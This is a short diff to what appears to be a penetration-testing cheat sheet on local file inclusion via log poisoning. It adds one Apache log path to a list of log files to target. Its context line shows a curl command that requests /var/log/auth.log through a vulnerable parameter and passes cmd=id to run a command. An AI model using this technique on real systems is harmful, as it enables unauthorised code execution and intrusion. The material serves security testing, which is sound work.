@@ -54,6 +54,7 @@ curl --user-agent "PENTEST" $URL/?parameter=/var/log/auth.log&cmd=id
 
 * /var/log/apache/access.log
 * /var/log/apache/error.log
+* /var/log/httpd-access.log
 * /var/log/vsftpd.log
 * /var/log/sshd.log
 * /var/log/mail
